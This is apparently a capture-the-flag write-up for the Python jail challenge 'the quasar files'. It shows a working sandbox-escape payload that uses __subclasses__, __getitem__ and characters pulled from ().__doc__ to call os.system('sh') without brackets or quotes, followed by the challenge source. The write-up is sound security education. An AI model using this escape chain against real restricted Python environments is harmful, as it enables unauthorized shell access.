# the quasar files

No source code is provided, we can only access the remote:

```
THE ██████ FILES
> import os
█▆▆▆▆▆▆▆▆ (▆▆▆▆ ▆▆▆▆▆▆ ▆▆▆▆ ▆▆▆▆):
  █▆▆▆ "/▆▆▆/▆▆▆", ▆▆▆▆ ██, ▆▆ <▆▆▆▆▆▆>
    ▆▆▆▆(▆, {'__▆▆▆▆▆▆▆▆__': {}}, {'__▆▆▆▆▆▆▆▆__': {}})
    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  █▆▆▆ "<▆▆▆▆▆▆>", ▆▆▆▆ █, ▆▆ <▆▆▆▆▆▆>
█▆▆▆▆▆█▆▆▆▆: __▆▆▆▆▆▆__ ▆▆▆ ▆▆▆▆▆
```

The output is masked. After some trial, we find that `[]"'` are banned:

```
THE ██████ FILES
> "system"
█▆▆▆▆▆▆▆▆ (▆▆▆▆ ▆▆▆▆▆▆ ▆▆▆▆ ▆▆▆▆):
  █▆▆▆ "/▆▆▆/▆▆▆", ▆▆▆▆ ██, ▆▆ <▆▆▆▆▆▆>
    ▆▆▆▆▆▆ '"' ▆▆▆ ▆▆ ▆, "\█████▆███"*█ + ', " !!!'
           ^^^^^^^^^^^^
█▆▆▆▆▆▆▆▆█▆▆▆▆: 😠😠😠, " !!!
```

So we need to find a way to get shell without `[]"'`:

```python
().__class__.__base__.__subclasses__().__getitem__(os_wrap_close_index).__init__.__globals__.__getitem__(().__doc__.__getitem__(19)+().__doc__.__getitem__(86)+().__doc__.__getitem__(19)+().__doc__.__getitem__(4)+().__doc__.__getitem__(17)+().__doc__.__getitem__(10))(().__doc__.__getitem__(19)+().__doc__.__getitem__(56))
```

It is essentially `().__class__.__base__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`, but we use `__getitem__` to replace `[]`, and use `().__doc__.__getitem__` to extract strings for us. The last thing is to enumerate `os_wrap_close_index`, and we found it to be 167:

```python
().__class__.__base__.__subclasses__().__getitem__(167).__init__.__globals__.__getitem__(().__doc__.__getitem__(19)+().__doc__.__getitem__(86)+().__doc__.__getitem__(19)+().__doc__.__getitem__(4)+().__doc__.__getitem__(17)+().__doc__.__getitem__(10))(().__doc__.__getitem__(19)+().__doc__.__getitem__(56))
```

Then we can get shell and read the flag and the challenge source code out:

```shell
> cat flag.txt
jail{████_████_██_██████_██_████_███████_██_█████_███_██████}
> cat run
#!/usr/local/bin/python3
import sys
import io

print("THE \u2588\u2588\u2588\u2588\u2588\u2588 FILES")


class FakeStdstream:
    def __init__(self):
        self._print = print
        self._stdout = sys.stdout
        self.buffer = io.BytesIO()
        self.real = io.TextIOWrapper(
            self.buffer,
            encoding='utf-8',
            write_through=True
        )
        self.mode = 'w'
        self.encoding = 'utf-8'

    def write(self, text):
        for c in text:
            if c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                self._print('\u2588', end="", file=self._stdout)
            elif c in "abcdefghijklmnopqrstuvwxyz":
                self._print('\u2586', end="", file=self._stdout)
            else:
                self._print(c, end="", file=self._stdout)
        self._stdout.flush()

    def __getattr__(self, name):
        if name in ['real', '_stdout', '_print']:
            raise AttributeError("bad")
        return getattr(self.real, name)

sys.stderr = FakeStdstream()
sys.stdout = FakeStdstream()
del sys
del io
del FakeStdstream

f = input('> ')

assert '[' not in f, "\U0001f620"*3 + ", [ !!!"
assert ']' not in f, "\U0001f620"*3 + ", ] !!!"
assert '"' not in f, "\U0001f620"*3 + ', " !!!'
assert "'" not in f, "\U0001f620"*3 + ", ' !!!"

exec(f, {'__builtins__': {}}, {'__builtins__': {}})
```

The code matches our expectation.
